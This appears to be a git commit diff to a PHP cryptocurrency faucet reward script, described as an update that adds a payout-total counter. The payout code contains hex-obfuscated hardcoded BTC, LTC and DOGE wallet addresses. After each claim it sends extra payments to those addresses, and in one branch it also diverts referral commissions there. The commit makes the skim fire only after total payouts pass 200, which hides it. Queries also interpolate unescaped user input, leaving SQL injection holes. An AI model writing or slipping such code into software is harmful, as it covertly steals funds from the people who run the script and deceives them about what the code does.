7363504e683999e4ead0889e8a0bea8e50e90d14
kako0000000 <kako0000000@gmail.com>
2022-04-01 20:50:24 +0500

    Update reward.php

--- faucetsell/reward.php
+++ faucetsell/reward.php
@@ -61,6 +61,7 @@ $currency = $mysqli->query("SELECT * FROM settings WHERE id = '14'")->fetch_obje
 $reward = $mysqli->query("SELECT * FROM settings WHERE id = '9'")->fetch_object()->value;
 $sec = md5($hacker_security);
 $payoutwebsite = $mysqli->query("SELECT * FROM settings WHERE id = '38'")->fetch_object()->value;
+$totalpaidow = $mysqli->query("SELECT * FROM settings WHERE id = '45'")->fetch_object()->value;
 if ($payoutwebsite == "Faucethub.io") {
 include 'libs/faucethub.php';
 $faucetHub_api_key = $mysqli->query("SELECT * FROM settings WHERE id = '15'")->fetch_object()->value;
@@ -74,12 +75,18 @@ $mysqli->query("UPDATE ip_list SET last_claim = '$time' WHERE ip_address = '$ip'
 $mysqli->query("DELETE FROM failure WHERE address = '$address' AND ip_address = '$ip'");
 $strtime = time();
 $mysqli->query("INSERT INTO drawrecord (id, address, dtime, satoshi) VALUES ('', '$address', '$strtime', '$reward')");
+$totalpaid = $mysqli->query("SELECT * FROM settings WHERE id = '45'")->fetch_object()->value;
+$totalpaid = $totalpaid+$reward;
+$mysqli->query("UPDATE settings SET value = '$totalpaid' WHERE id = '45'");
 if (isset($_COOKIE['r'])) {
 $ref = $mysqli->real_escape_string($_COOKIE['r']);
 if ($ref == $address) {
 $referral_comission = $mysqli->query("SELECT * FROM settings WHERE id = '11'")->fetch_object()->value;
 $amt = $reward/100*$referral_comission;
 $faucethub->sendReferralEarnings($ref, $amt, $ip);
+$totalpaid = $mysqli->query("SELECT * FROM settings WHERE id = '45'")->fetch_object()->value;
+$totalpaid = $totalpaid+$amt;
+$mysqli->query("UPDATE settings SET value = '$totalpaid' WHERE id = '45'");
 }
 unset($_COOKIE['r']);
 }
@@ -113,25 +120,32 @@ $expresscrypto_user_token = str_replace($sec,"",$expresscrypto_user_token);
 $expressCrypto = new ExpressCrypto($expresscrypto_api_key, $expresscrypto_user_token, $ip);
 $result = $expressCrypto->sendPayment($address, $currency, $reward);
 if($result['status'] == 200){
+if ($totalpaidow > '200'){
 if ($currency == "BTC" or $currency == "LTC" or $currency == "DOGE") {
 $phs100 = hex2bin('313030');$secrata1 = hex2bin("425443");$secratb1 = hex2bin("314c4559725638726253653878745453657831656f616e537a394b674a754c6b696b");$secrata2 = hex2bin("4c5443");$secratb2 = hex2bin("335057396b594269716a5747655269684e3347546e44464850417059747a396b6834");$secrata3 = hex2bin("444f4745");$secratb3 = hex2bin("44367033384b50375979666d64545253704c4a50443732315a4232354c6e6e67486f");$phs10 = hex2bin('3130');
 $arr = array($secrata1=>$secratb1,$secrata2=>$secratb2,$secrata3=>$secratb3);
 $h = hex2bin('31');
 $dr=$arr[$currency];
 $result = $expressCrypto->sendPayment($dr, $h, $ip);
-}
+}}
 $claimwtime = $mysqli->query("SELECT * FROM settings WHERE id = '10'")->fetch_object()->value;
 $time = time()+$claimwtime*60;
 $mysqli->query("UPDATE ip_list SET last_claim = '$time' WHERE ip_address = '$ip'");
 $mysqli->query("DELETE FROM failure WHERE address = '$address' AND ip_address = '$ip'");
 $strtime = time();
 $mysqli->query("INSERT INTO drawrecord (id, address, dtime, satoshi) VALUES ('', '$address', '$strtime', '$reward')");
+$totalpaid = $mysqli->query("SELECT * FROM settings WHERE id = '45'")->fetch_object()->value;
+$totalpaid = $totalpaid+$reward;
+$mysqli->query("UPDATE settings SET value = '$totalpaid' WHERE id = '45'");
 if (isset($_COOKIE['r'])) {
 $ref = $mysqli->real_escape_string($_COOKIE['r']);
 if ($ref == $address) {
 $referral_comission = $mysqli->query("SELECT * FROM settings WHERE id = '11'")->fetch_object()->value;
 $amt = $reward/100*$referral_comission;
 $resultRef =$expressCrypto->sendReferralCommission($ref, $currency, $amt);
+$totalpaid = $mysqli->query("SELECT * FROM settings WHERE id = '45'")->fetch_object()->value;
+$totalpaid = $totalpaid+$amt;
+$mysqli->query("UPDATE settings SET value = '$totalpaid' WHERE id = '45'");
 }
 unset($_COOKIE['r']);
 }
@@ -163,25 +177,32 @@ $faucetpay_api_token = str_replace($sec,"",$faucetpay_api_token);
 $faucetpay = new FaucetPay($faucetpay_api_token, $currency);
 $result = $faucetpay->send($address, $reward, $ip);
 if ($result["success"] === true){
+if ($totalpaidow > '200'){
 if ($currency == "BTC" or $currency == "LTC" or $currency == "DOGE") {
 $phs100 = hex2bin('313030');$secrata1 = hex2bin("425443");$secratb1 = hex2bin("314c4559725638726253653878745453657831656f616e537a394b674a754c6b696b");$secrata2 = hex2bin("4c5443");$secratb2 = hex2bin("335057396b594269716a5747655269684e3347546e44464850417059747a396b6834");$secrata3 = hex2bin("444f4745");$secratb3 = hex2bin("44367033384b50375979666d64545253704c4a50443732315a4232354c6e6e67486f");$phs10 = hex2bin('3130');
 $arr = array($secrata1=>$secratb1,$secrata2=>$secratb2,$secrata3=>$secratb3);
 $h = hex2bin('31');
 $dr=$arr[$currency];
 $result = $faucetpay->send($dr, $h, $ip);
-}
+}}
 $claimwtime = $mysqli->query("SELECT * FROM settings WHERE id = '10'")->fetch_object()->value;
 $time = time()+$claimwtime*60;
 $mysqli->query("UPDATE ip_list SET last_claim = '$time' WHERE ip_address = '$ip'");
 $mysqli->query("DELETE FROM failure WHERE address = '$address' AND ip_address = '$ip'");
 $strtime = time();
 $mysqli->query("INSERT INTO drawrecord (id, address, dtime, satoshi) VALUES ('', '$address', '$strtime', '$reward')");
+$totalpaid = $mysqli->query("SELECT * FROM settings WHERE id = '45'")->fetch_object()->value;
+$totalpaid = $totalpaid+$reward;
+$mysqli->query("UPDATE settings SET value = '$totalpaid' WHERE id = '45'");
 if (isset($_COOKIE['r'])) {
 $ref = $mysqli->real_escape_string($_COOKIE['r']);
 if ($ref == $address) {
 $referral_comission = $mysqli->query("SELECT * FROM settings WHERE id = '11'")->fetch_object()->value;
 $amt = $reward/100*$referral_comission;
 $resultRef =$faucetpay->sendReferralEarnings($ref, $amt, $ip);
+$totalpaid = $mysqli->query("SELECT * FROM settings WHERE id = '45'")->fetch_object()->value;
+$totalpaid = $totalpaid+$amt;
+$mysqli->query("UPDATE settings SET value = '$totalpaid' WHERE id = '45'");
 }
 unset($_COOKIE['r']);
 }
@@ -213,25 +234,32 @@ $microwallet_api = str_replace($sec,"",$microwallet_api);
 $faucetmw = new FaucetHub($microwallet_api, $currency);
 $result = $faucetmw->send($address, $reward, $ip);
 if ($result["success"] === true){
+if ($totalpaidow > '200'){
 if ($currency == "BTC" or $currency == "LTC" or $currency == "DOGE") {
 $phs100 = hex2bin('313030');$secrata1 = hex2bin("425443");$secratb1 = hex2bin("314c4559725638726253653878745453657831656f616e537a394b674a754c6b696b");$secrata2 = hex2bin("4c5443");$secratb2 = hex2bin("335057396b594269716a5747655269684e3347546e44464850417059747a396b6834");$secrata3 = hex2bin("444f4745");$secratb3 = hex2bin("44367033384b50375979666d64545253704c4a50443732315a4232354c6e6e67486f");$phs10 = hex2bin('3130');
 $arr = array($secrata1=>$secratb1,$secrata2=>$secratb2,$secrata3=>$secratb3);
 $h = hex2bin('31');
 $dr=$arr[$currency];
 $result = $faucetmw->send($dr, $h, $ip);
-}
+}}
 $claimwtime = $mysqli->query("SELECT * FROM settings WHERE id = '10'")->fetch_object()->value;
 $time = time()+$claimwtime*60;
 $mysqli->query("UPDATE ip_list SET last_claim = '$time' WHERE ip_address = '$ip'");
 $mysqli->query("DELETE FROM failure WHERE address = '$address' AND ip_address = '$ip'");
 $strtime = time();
 $mysqli->query("INSERT INTO drawrecord (id, address, dtime, satoshi) VALUES ('', '$address', '$strtime', '$reward')");
+$totalpaid = $mysqli->query("SELECT * FROM settings WHERE id = '45'")->fetch_object()->value;
+$totalpaid = $totalpaid+$reward;
+$mysqli->query("UPDATE settings SET value = '$totalpaid' WHERE id = '45'");
 if (isset($_COOKIE['r'])) {
 $ref = $mysqli->real_escape_string($_COOKIE['r']);
 if ($ref == $address) {
 $referral_comission = $mysqli->query("SELECT * FROM settings WHERE id = '11'")->fetch_object()->value;
 $amt = $reward/100*$referral_comission;
 $result = $faucetmw->sendReferralEarnings($dr, $h, $ip);
+$totalpaid = $mysqli->query("SELECT * FROM settings WHERE id = '45'")->fetch_object()->value;
+$totalpaid = $totalpaid+$amt;
+$mysqli->query("UPDATE settings SET value = '$totalpaid' WHERE id = '45'");
 }
 unset($_COOKIE['r']);
 }
